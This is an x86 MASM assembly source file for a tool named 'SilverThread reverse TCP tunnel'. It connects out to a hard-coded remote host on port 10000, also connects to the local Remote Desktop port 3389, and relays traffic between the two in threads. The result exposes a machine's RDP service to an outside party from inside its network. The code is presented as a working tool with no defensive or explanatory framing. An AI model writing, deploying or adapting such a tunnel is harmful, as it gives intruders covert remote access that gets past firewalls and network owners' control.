; SilverThread reverse TCP tunnel by afx237
.586
.model flat, stdcall
option casemap:none

	include c:\masm32\include\windows.inc
	include c:\masm32\include\kernel32.inc
	include c:\masm32\include\shell32.inc
	include c:\masm32\include\user32.inc
	include c:\masm32\include\GDI32.inc
	include c:\masm32\include\comdlg32.inc
	include c:\masm32\include\COMCTL32.inc
	include c:\masm32\include\advapi32.inc
	include c:\masm32\include\ole32.inc
	include c:\masm32\include\wininet.inc
	include c:\masm32\include\crtlib.inc
	include c:\masm32\include\masm32.inc
	include c:\masm32\include\ws2_32.inc
	include c:\masm32\include\mpr.inc

	includelib c:\masm32\lib\mpr.lib
	includelib c:\masm32\lib\ws2_32.lib
	includelib c:\masm32\lib\crtlib.lib
	includelib c:\masm32\lib\wininet.lib
	includelib c:\masm32\lib\ole32.lib
	includelib c:\masm32\lib\GDI32.lib
	includelib c:\masm32\lib\comdlg32.lib
	includelib c:\masm32\lib\COMCTL32.lib
	includelib c:\masm32\lib\advapi32.lib
	includelib c:\masm32\lib\user32.lib
	includelib c:\masm32\lib\kernel32.lib
	includelib c:\masm32\lib\shell32.lib
	includelib c:\masm32\lib\masm32.lib

	  
;Procedures definition	  

ZeroMemory equ <RtlZeroMemory>
ConnectSocket 	proto stdcall :dword
FindHostIP	   	proto stdcall :dword
StartTunnel		proto stdcall 
FillSockAddr	proto stdcall :dword, :dword, :dword
FThread			proto stdcall :dword

.data

	
	RemoteServer	db	"192.168.141.1",0
	LocalServer		db	"127.0.0.1",0
	
	RSERVER_PORT	equ	10000
	LSERVER_PORT	equ	3389
	
	TEMP_BUFFER_SIZE 	equ 128
	REQ_WINSOCK_VER		equ	2
	RemoteThreadID 		dd	0
	LocalThreadID		dd	0
	
	thread_struct struct
		dword_1 dd 0
		dword_2 dd 0
	thread_struct ends
	

	
	ConnParams struct
		Socket1 dd 0
		Socket2 dd 0
		SocketDataPtr dd 0
		SocketDataLen dd 0
	ConnParams ends
	
	CParamsR ConnParams <>;
	CParamsL ConnParams <>;
	
	FCParams1 ConnParams <>;
	FCParams2 ConnParams <>;
	CSocketR	dd	0
	CSocketL	dd	0
	CR	equ	0Dh
	LF	equ	0Ah
	
	;debugging variables
	
	
	DBG_OUTPUT	db	1	; if 0 - output disabled
	
	g_msgncoming db "Forwarding data!",CR,LF,0
	ID1	db "I'm Remote",CR,LF,0
	ID2 db "I'm Local",CR,LF,0
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


	g_msgLookupHost		db	"Looking up hostname %s... ",0
	g_msgFound			db	"found.",CR,LF,0
	g_msgCreateSock		db	"Creating socket... ",0
	g_msgCreated		db	"created.",CR,LF,0
	g_msgConnect		db	"Attempting to connect to %s:%d... ",0
	g_msgConnected		db	"connected.",CR,LF,0
	g_msgSendReq		db	"Sending request... ",0
	g_msgReqSent		db	"request sent.",CR,LF,0
	g_msgDumpData		db	"Dumping received data...",CR,LF,CR,LF,0
	g_msgInitWinsock	db	"Initializing winsock... ",0
	g_msgInitialized	db	"initialized.",CR,LF,0
	g_msgDone			db	"done.",CR,LF,0
	g_msgCleanup		db	"Cleaning up winsock... ",0
	
	g_errHostName		db	"could not resolve hostname.",CR,LF,0
	g_errCreateSock		db	"could not create socket.",CR,LF,0
	g_errConnect		db	"could not connect.",CR,LF,0
	g_errSend			db	"failed to send data.",CR,LF,0
	g_errRead			db	"socket error while receiving.",CR,LF,0
	g_errStartup		db	"startup failed!",0
	g_errVersion		db	"required version not supported!",0
	g_errCleanup		db	"cleanup failed!",CR,LF,0
	
	g_errLocalConn		db	"Server have just closed connection. quiting..",CR,LF,0

.code
;-------------------------------------------------------------------------------
; 	 includes
;-------------------------------------------------------------------------------
	include socket_staff.asm
;-------------------------------------------------------------------------------
; 	startup code
;-------------------------------------------------------------------------------
start:

	invoke	StartTunnel
	invoke	ExitProcess, eax


;-------------------------------------------------------------------------------
; <StartTunnel>
;-------------------------------------------------------------------------------
StartTunnel proc   
	;Iinitializing winsocks
	local 	wsaData:WSADATA
	.IF  DBG_OUTPUT == 1	
		invoke	printf, addr g_msgInitWinsock
	.ENDIF
	invoke	WSAStartup, REQ_WINSOCK_VER, addr wsaData
	
	;Checking the initialization was ok
	mov		ecx, offset g_errStartup
	test	eax, eax
	jnz		_error

	; Checking WinSock version
	cmp		byte ptr [wsaData.wVersion], REQ_WINSOCK_VER
	mov		ecx, offset g_errVersion
	jb		_error_cleanup
	
	
	;Connecting remote TCP port
	_try_rconnect:
		invoke	ConnectSocket, addr RemoteServer
		test eax,eax
		jz _try_rconnect
	
	
	;Connecting local TCP port
	_try_lconnect:
		invoke	ConnectSocket, addr LocalServer
		test eax,eax
		jz _try_rconnect
	
	
	
	;;;;Filling forwarding structures
	mov eax,CParamsR.Socket1
	mov FCParams1.Socket1,eax
	mov eax,CParamsL.Socket1
	mov FCParams1.Socket2,eax
	mov eax,CParamsL.SocketDataPtr
	mov FCParams1.SocketDataPtr,eax
	
	mov eax,CParamsL.Socket1
	mov FCParams2.Socket1,eax
	mov eax,CParamsR.Socket1
	mov FCParams2.Socket2,eax		
	mov eax,CParamsR.SocketDataLen
	mov FCParams2.SocketDataLen,eax

	;;;;Startrig Forwarding threads
	;;;Remote connection
	invoke CreateThread,NULL,NULL,addr FThread  ,addr FCParams2,0,addr RemoteThreadID
	;;;;
	;;;;Local connection
	invoke CreateThread,NULL,NULL,addr FThread  ,addr FCParams1,0,addr LocalThreadID
	

	;infinite loop	
	.WHILE TRUE
		invoke Sleep, 1
	.ENDW

	ret
	;Debug info output
	_cleanup:
		.IF  DBG_OUTPUT == 1
			invoke	printf, addr g_msgCleanup
		.ENDIF
		invoke	WSACleanup
		test	eax, eax
		jz		_done
		.IF  DBG_OUTPUT == 1
			invoke	printf, addr g_errCleanup
		.ENDIF
	_done:
		.IF  DBG_OUTPUT == 1
			invoke	printf, addr g_msgDone
		.ENDIF
		mov		eax, ebx	; return code in ebx
		ret	
		
	_error_cleanup:
		mov		ebx, _cleanup
		jmp		_printError
	_error:
		mov		ebx, _done
	_printError:
		.IF  DBG_OUTPUT == 1
			invoke	printf, ecx
		.ENDIF
		mov		eax, ebx
		mov		ebx, 1		; return 1 (error)
		jmp		eax
		
StartTunnel endp


;-------------------------------------------------------------------------------
; <ConnectSocket>
;-------------------------------------------------------------------------------
; Parameters
;	pHostname		pointer to a string containing the server name or IP address
; Return value 
;	0:		failed
;  	1:		succeeded

ConnectSocket proc  pServername:dword
	local	tempBuffer[TEMP_BUFFER_SIZE]:byte, sockAddr:sockaddr_in

	;Checking is server remote, or local
	mov eax,pServername
	lea ecx,RemoteServer
	.IF ecx == eax
		;remote
		push eax
		.IF  DBG_OUTPUT == 1
			invoke	printf, addr ID1
		.ENDIF
		pop eax
		invoke	FillSockAddr, addr sockAddr, eax, RSERVER_PORT
		; Creating socket:
		invoke	socket, AF_INET, SOCK_STREAM, IPPROTO_TCP
		;checking for errors
		mov		ecx, offset g_errCreateSock
		cmp		eax, INVALID_SOCKET
		je		_error
		mov		esi, eax
		.IF  DBG_OUTPUT == 1
			invoke	printf, addr g_msgCreated
		.ENDIF
		
		;;;;Filling sonnected sockets structs
		
		mov CParamsR.Socket2, NULL
		lea eax,sockAddr
		mov CParamsR.SocketDataPtr, eax
		mov eax, sizeof sockAddr
		mov CParamsR.SocketDataLen, eax
		; Attempt to connect:
		invoke 	connect, esi, CParamsR.SocketDataPtr, CParamsR.SocketDataLen
		mov CParamsR.Socket1, esi
				
		
	.ELSE
		;local
		push eax
		.IF  DBG_OUTPUT == 1
			invoke	printf, addr ID2
		.ENDIF
		pop eax
		invoke	FillSockAddr, addr sockAddr, eax, LSERVER_PORT
		; Creating socket:
		invoke	socket, AF_INET, SOCK_STREAM, IPPROTO_TCP
		;checking for errors
		mov		ecx, offset g_errCreateSock
		cmp		eax, INVALID_SOCKET
		je		_error
		mov		esi, eax
		.IF  DBG_OUTPUT == 1
			invoke	printf, addr g_msgCreated
		.ENDIF
		;;;;Filling connected sockets structs
		
		mov CParamsL.Socket2, NULL
		lea eax,sockAddr
		mov CParamsL.SocketDataPtr, eax
		mov eax, sizeof sockAddr
		mov CParamsL.SocketDataLen, eax
		; Attempt to connect:
		;invoke 	connect, esi, addr sockAddr, sizeof sockAddr
		
		invoke 	connect, esi, CParamsL.SocketDataPtr, CParamsL.SocketDataLen
		mov CParamsL.Socket1, esi
		;;;;
		
	.ENDIF
	
	;If socket connection was fucked up we are closing it carfully.
	mov		ecx, offset g_errConnect
	test	eax, eax
	jnz		_error
	.IF  DBG_OUTPUT == 1
		invoke	printf, offset g_msgConnected
	.ENDIF
	mov 	eax,1
	ret
	
_connectionClosed:
	
	mov		ebx, 1 ; return code (1 = no error)

_cleanup:
	; close socket if it was created:
	cmp		esi, INVALID_SOCKET
	je		@F
	invoke	closesocket, esi
	@@:
	mov		eax, ebx
	ret

_error:
	.IF  DBG_OUTPUT == 1
		invoke	printf, ecx
	.ENDIF
	xor		ebx, ebx  ; return code (0 = error)
	jmp		_cleanup
ConnectSocket endp

end start